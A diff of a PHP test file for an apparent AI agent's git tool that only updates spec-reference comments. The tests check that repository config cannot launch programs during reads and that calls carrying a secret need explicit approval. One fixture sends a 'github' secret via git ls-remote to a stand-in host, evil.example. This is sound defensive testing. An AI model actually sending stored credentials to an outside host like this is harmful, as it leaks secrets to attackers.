@@ -75,7 +75,7 @@ final class GitToolTest extends AsyncTestCase {
 
         $result = $tool->execute(['args' => ['status', '--short']], $this->context());
 
-        // spec: brief/decisions.md#решения-по-доработкам-2026-11-18 — a read runs without a card, so the repository may not make
+        // spec: brief/scheduler.md#git-с-доступом-из-хранилища — a read runs without a card, so the repository may not make
         //       it start a program: settings that would are off, and a config with filters or diff programs stops it
         self::assertFalse($result->isError, $result->content);
         $command = $this->sandbox->calls[0] ?? '';
@@ -137,7 +137,7 @@ final class GitToolTest extends AsyncTestCase {
         $tool = $this->tool();
         $read = ['args' => ['ls-remote', 'https://evil.example/x.git'], 'secret' => 'github', 'origin' => 'https://evil.example'];
 
-        // spec: brief/decisions.md#решения-по-доработкам-2026-11-18 — a call with a secret is always a card: the pair secret + address
+        // spec: brief/agent-loop.md#секреты-маскирование-и-вызовы-с-секретом — a call with a secret is always a card: the pair secret + address
         self::assertSame(DangerClass::Irreversible, $tool->danger($read), 'a read with a secret is not a read');
         self::assertSame(DangerClass::Irreversible, $tool->danger(['args' => ['fetch'], 'secret' => 'github', 'origin' => 'https://github.com']));
         self::assertSame('git-secret:github https://evil.example', $tool->grantKey($read));
